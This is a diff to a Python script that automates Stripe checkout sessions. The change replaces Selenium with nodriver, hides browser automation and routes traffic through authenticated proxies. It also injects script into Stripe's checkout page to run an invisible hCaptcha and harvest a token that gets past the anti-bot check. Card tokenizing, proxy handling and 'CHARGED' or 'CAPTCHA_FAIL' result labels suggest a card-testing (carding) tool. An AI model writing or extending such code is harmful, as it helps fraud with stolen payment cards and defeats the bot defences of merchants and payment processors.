@@ -3,15 +3,13 @@ import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, se
 import urllib.parse
 from urllib.parse import unquote, urlencode, urljoin, urlparse
 from datetime import datetime
-import zipfile, tempfile
+import zipfile, tempfile, shutil
 
 try:
     import aiohttp
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
+    import nodriver as uc
 except ImportError:
-    print("pip install aiohttp selenium --break-system-packages"); sys.exit(1)
+    print("pip install aiohttp nodriver --break-system-packages"); sys.exit(1)
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
@@ -96,120 +94,125 @@ def is_param_error(msg):
     return ("unknown parameter" in m or "parameter_unknown" in m
             or "received unknown" in m or "did you mean" in m)
 
-def _create_proxy_auth_extension(host, port, user, pw):
-    manifest_json = '{"version": "1.0.0", "manifest_version": 2, "name": "Chrome Proxy", "permissions": ["proxy", "tabs", "unlimitedStorage", "storage", "<all_urls>", "webRequest", "webRequestBlocking"], "background": {"scripts": ["background.js"]}, "minimum_chrome_version":"22.0.0"}'
+def _create_proxy_auth_folder(host, port, user, pw):
+    ext_dir = os.path.join(tempfile.gettempdir(), f"pxauth_{host}_{port}")
+    os.makedirs(ext_dir, exist_ok=True)
+
+    manifest_json = ('{"version": "1.0.0", "manifest_version": 2, '
+        '"name": "Chrome Proxy", '
+        '"permissions": ["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"], '
+        '"background": {"scripts": ["background.js"]}, "minimum_chrome_version":"22.0.0"}')
+
     background_js = '''
     var config = {
-            mode: "fixed_servers",
-            rules: {
-              singleProxy: { scheme: "http", host: "%s", port: parseInt(%s) },
-              bypassList: ["localhost"]
-            }
-          };
+      mode: "fixed_servers",
+      rules: {
+        singleProxy: { scheme: "http", host: "%s", port: parseInt(%s) },
+        bypassList: ["localhost"]
+      }
+    };
     chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
     function callbackFn(details) {
-        return { authCredentials: { username: "%s", password: "%s" } };
+      return { authCredentials: { username: "%s", password: "%s" } };
     }
-    chrome.webRequest.onAuthRequired.addListener(callbackFn, {urls: ["<all_urls>"]}, ['blocking']);
+    chrome.webRequest.onAuthRequired.addListener(
+      callbackFn, {urls: ["<all_urls>"]}, ['blocking']
+    );
     ''' % (host, port, user, pw)
-    
-    ext_path = os.path.join(tempfile.gettempdir(), f"proxy_auth_{host}.zip")
-    with zipfile.ZipFile(ext_path, 'w') as zp:
-        zp.writestr("manifest.json", manifest_json)
-        zp.writestr("background.js", background_js)
-    return ext_path
 
-def _run_selenium_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
-    opts = Options()
-    opts.add_argument("--headless=new")
-    opts.add_argument("--no-sandbox")
-    opts.add_argument("--disable-dev-shm-usage")
-    opts.add_argument("--disable-gpu")
-    opts.add_argument("--disable-software-rasterizer")
-    opts.add_argument("--no-zygote")
-    opts.add_argument("--window-size=1920,1080")
-    opts.add_argument("--disable-blink-features=AutomationControlled")
-    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
-    opts.add_experimental_option('useAutomationExtension', False)
-    opts.binary_location = "/usr/bin/chromium-browser"
+    with open(os.path.join(ext_dir, "manifest.json"), "w") as f:
+        f.write(manifest_json)
+    with open(os.path.join(ext_dir, "background.js"), "w") as f:
+        f.write(background_js)
 
-    ext_path = None
+    return ext_dir
+
+async def _run_nodriver_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
+    if not sitekey:
+        log("[nodriver] missing sitekey — cannot solve", C.RED)
+        return None
+
+    browser_args = [
+        "--no-sandbox",
+        "--disable-dev-shm-usage",
+        "--disable-blink-features=AutomationControlled",
+        "--window-size=1920,1080",
+        "--lang=en-US",
+    ]
+
+    ext_dir = None
     if proxy_entry:
         parsed = urlparse(proxy_entry["url"])
-        host = parsed.hostname
-        port = parsed.port
         if proxy_entry.get("auth"):
-            user, pw = proxy_entry["auth"]
-            ext_path = _create_proxy_auth_extension(host, port, user, pw)
-            opts.add_extension(ext_path)
+            ext_dir = _create_proxy_auth_folder(
+                parsed.hostname, parsed.port,
+                proxy_entry["auth"][0], proxy_entry["auth"][1]
+            )
+            browser_args.append(f"--load-extension={ext_dir}")
+            browser_args.append(f"--disable-extensions-except={ext_dir}")
         else:
-            opts.add_argument(f"--proxy-server={proxy_entry['url']}")
+            browser_args.append(f"--proxy-server={proxy_entry['url']}")
 
-    service = Service(executable_path="/usr/bin/chromedriver")
-    driver = None
+    browser = None
     try:
-        driver = webdriver.Chrome(service=service, options=opts)
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        
-        driver.get(checkout_url)
-        
-        token = None
-        for _ in range(20):
-            time.sleep(1)
-            token = driver.execute_script("""
-                if (typeof hcaptcha !== 'undefined') {
-                    try { return hcaptcha.getResponse(); } catch(e) {}
-                }
-                return document.querySelector('[name="h-captcha-response"]')?.value || 
-                       document.querySelector('textarea[name="h-captcha-response"]')?.value || 
-                       document.querySelector('input[name="h-captcha-response"]')?.value || 
-                       null;
-            """)
-            if token:
-                break
-                
-        if not token:
-            if rqdata and sitekey:
-                log(f"[Selenium] Executing hcaptcha manually...", C.YEL)
-                driver.execute_script(f"""
-                    if (typeof hcaptcha !== 'undefined') {{
-                        hcaptcha.execute('{sitekey}', {{rqdata: '{rqdata}'}});
-                    }} else {{
-                        const script = document.createElement('script');
-                        script.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
-                        script.onload = () => {{
-                            hcaptcha.render(document.createElement('div'), {{
-                                sitekey: '{sitekey}',
-                                size: 'invisible',
-                                callback: function(t) {{ window.__hcaptcha_token = t; }}
-                            }});
-                            hcaptcha.execute(undefined, {{rqdata: '{rqdata}'}});
-                        }};
-                        document.head.appendChild(script);
-                    }}
-                """)
-                for _ in range(15):
-                    time.sleep(1)
-                    token = driver.execute_script("return window.__hcaptcha_token || document.querySelector('textarea[name=\"h-captcha-response\"]')?.value;")
-                    if token:
-                        break
-                        
-        if token:
-            log(f"[Selenium] Token successfully retrieved!", C.LIME)
-        else:
-            log(f"[Selenium] Token NOT found after all attempts.", C.RED)
-        return token
+        browser = await uc.start(headless=True, browser_args=browser_args, sandbox=False)
+        page = await browser.get(checkout_url)
+        await page.sleep(3)
+
+        rq_safe = (rqdata or "").replace("\\", "\\\\").replace("'", "\\'")
+        sk_safe = sitekey.replace("'", "\\'")
+
+        js = f"""
+        (async () => {{
+            if (typeof hcaptcha === 'undefined') {{
+                await new Promise((res, rej) => {{
+                    const s = document.createElement('script');
+                    s.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
+                    s.onload = res;
+                    s.onerror = () => rej('script-load-fail');
+                    document.head.appendChild(s);
+                }});
+            }}
+            return await new Promise((resolve, reject) => {{
+                const holder = document.createElement('div');
+                holder.id = '__hc_holder';
+                document.body.appendChild(holder);
+                let done = false;
+                const t = setTimeout(() => {{ if (!done) reject('timeout-15s'); }}, 15000);
+                const wid = hcaptcha.render(holder, {{
+                    sitekey: '{sk_safe}',
+                    size: 'invisible',
+                    rqdata: '{rq_safe}',
+                    callback: (tok) => {{ if (done) return; done = true; clearTimeout(t); resolve(tok); }},
+                    'error-callback': (e) => {{ if (done) return; done = true; clearTimeout(t); reject('err:' + e); }}
+                }});
+                hcaptcha.execute(wid, {{rqdata: '{rq_safe}'}}).catch(e => {{
+                    if (!done) {{ done = true; clearTimeout(t); reject('exec:' + e); }}
+                }});
+            }});
+        }})()
+        """
+
+        token = await page.evaluate(js, await_promise=True, return_by_value=True)
+
+        if token and isinstance(token, str) and len(token) > 20:
+            log(f"[nodriver] token OK ({len(token)} chars)", C.LIME)
+            return token
+        log(f"[nodriver] token invalid: {str(token)[:80]}", C.RED)
+        return None
     except Exception as e:
-        log(f"[Selenium] EXCEPTION: {e}", C.RED)
+        log(f"[nodriver] EXC: {type(e).__name__}: {str(e)[:120]}", C.RED)
         return None
     finally:
-        if driver: driver.quit()
-        if ext_path and os.path.exists(ext_path):
-            try: os.remove(ext_path)
-            except: pass
+        try:
+            if browser: browser.stop()
+        except Exception: pass
+        if ext_dir and os.path.exists(ext_dir):
+            try: shutil.rmtree(ext_dir, ignore_errors=True)
+            except Exception: pass
 
 async def solve_hcaptcha_selenium(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
-    return await asyncio.to_thread(_run_selenium_hcaptcha, checkout_url, proxy_entry, rqdata, sitekey)
+    return await _run_nodriver_hcaptcha(checkout_url, proxy_entry, rqdata, sitekey)
 
 async def solve_hcaptcha(sk, pg, rq, max_attempts=2):
     return None
@@ -244,6 +247,7 @@ class StripeSession:
         self.amount_str = "N/A"; self.raw_amount = 0
         self.session = None; self.email = ""
         self.init_json = {}
+        self.hcaptcha_sitekey = HCK
         self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}
         self._current_card = None
         self._current_pm_id = None
@@ -339,6 +343,21 @@ class StripeSession:
         curr = (j.get("currency") or "usd").upper()
         self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
         self.init_json = j
+        
+        try:
+            passive = j.get("passive_captcha") or {}
+            if not passive and isinstance(j.get("account_settings"), dict):
+                passive = j["account_settings"].get("passive_captcha") or {}
+            sk = (passive.get("site_key") or passive.get("sitekey")
+                  or passive.get("key") or j.get("captcha_site_key"))
+            if sk and isinstance(sk, str) and len(sk) > 10:
+                self.hcaptcha_sitekey = sk
+                log(f"sitekey resolved: {sk[:16]}...", C.LIME)
+            else:
+                log(f"sitekey fallback to default", C.YEL)
+        except Exception as e:
+            log(f"sitekey extract err: {e}", C.YEL)
+            
         return True, None
 
     async def _tokenize(self, card):
@@ -475,8 +494,16 @@ class StripeSession:
         sjs = use_sdk.get("stripe_js") or {}
         pi_id = pi.get("id")
         cs_secret = pi.get("client_secret")
-        rqdata = sjs.get("rqdata") or conf.get("rqdata")
-        site_key = sjs.get("site_key") or sjs.get("captcha_site_key") or HCK
+        
+        rqdata = (sjs.get("rqdata")
+                  or conf.get("rqdata")
+                  or (pi.get("next_action", {}).get("use_stripe_sdk", {})
+                      .get("stripe_js", {}).get("rqdata")))
+        site_key = (sjs.get("site_key")
+                    or sjs.get("captcha_site_key")
+                    or getattr(self, "hcaptcha_sitekey", HCK)
+                    or HCK)
+                    
         source = find_source_recursive(conf) or find_source_recursive(pi) or find_source_recursive(use_sdk)
         log(f"WAF -> source={bool(source)} rq={bool(rqdata)}", C.GOLD)
         
@@ -497,7 +524,7 @@ class StripeSession:
                     return {"success": True, "status": "CHARGED", "message": f"Verify ({st})", "raw": r}
         
         if self.cs:
-            log("S4: Selenium Local Browser", C.GOLD)
+            log("S4: Nodriver Local Browser", C.GOLD)
             checkout_url = f"https://checkout.stripe.com/c/pay/{self.cs}"
             token = await solve_hcaptcha_selenium(checkout_url, self._proxy, rqdata, site_key)
             if token:
@@ -507,7 +534,7 @@ class StripeSession:
                     vpi = r.get("payment_intent") or r.get("setup_intent") or r
                     st = vpi.get("status", "") if isinstance(vpi, dict) else ""
                     if st in ("succeeded","requires_capture","complete"):
-                        return {"success": True, "status": "CHARGED", "message": f"Selenium ({st})", "raw": r}
+                        return {"success": True, "status": "CHARGED", "message": f"Nodriver ({st})", "raw": r}
         return {"success": False, "status": "CAPTCHA_FAIL", "message": "WAF unrecoverable"}
 
     async def _handle_3ds(self, conf, pi, source):
